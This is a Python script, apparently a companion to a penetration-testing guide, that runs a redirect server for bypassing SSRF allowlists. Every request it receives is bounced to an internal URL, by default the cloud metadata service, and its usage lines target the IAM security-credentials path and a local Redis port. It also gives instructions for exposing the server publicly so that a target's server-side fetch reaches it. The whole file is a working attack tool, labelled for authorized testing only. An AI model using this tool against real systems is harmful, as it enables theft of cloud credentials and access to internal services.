#!/usr/bin/env python3
"""
redirect_server.py — host a 30x redirect to an internal/metadata URL for SSRF allowlist bypass (guide §8).
If the target validates the FIRST url (must be an allowed/external host) but FOLLOWS redirects, point the
sink at this server; it bounces the server-side fetch to an internal/metadata target.

AUTHORIZED TESTING ONLY. Expose publicly (ngrok/cloudflared) so the target can reach it, then set the
sink's url to http://YOUR-HOST/r  (or /<anything>).

Usage:
  python3 redirect_server.py --to "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --port 8000
  python3 redirect_server.py --to "http://127.0.0.1:6379/" --code 302
"""
import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET = "http://169.254.169.254/latest/meta-data/"
CODE = 302


class Redir(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[HIT] {self.client_address[0]} {self.command} {self.path}  UA={self.headers.get('User-Agent','')}"
              f"  -> {CODE} {TARGET}")
        self.send_response(CODE)
        self.send_header("Location", TARGET)
        self.end_headers()
    do_POST = do_GET
    do_HEAD = do_GET

    def log_message(self, *a):
        pass  # we print our own


def main():
    global TARGET, CODE
    ap = argparse.ArgumentParser(description="Redirect server for SSRF allowlist bypass.")
    ap.add_argument("--to", required=True, help="internal/metadata URL to redirect the server-side fetch to")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--code", type=int, default=302, choices=[301, 302, 303, 307, 308])
    args = ap.parse_args()
    TARGET, CODE = args.to, args.code
    print(f"[*] Redirect server on 0.0.0.0:{args.port}  ->  {CODE}  {TARGET}")
    print(f"[*] Point the SSRF sink at:  http://YOUR-HOST:{args.port}/r")
    print(f"[*] (expose with: ngrok http {args.port}  /  cloudflared tunnel --url http://localhost:{args.port})")
    print("[*] Each [HIT] from the TARGET's server/cloud IP confirms it followed the redirect (guide §8).")
    try:
        ThreadingHTTPServer(("0.0.0.0", args.port), Redir).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] stopped")


if __name__ == "__main__":
    main()
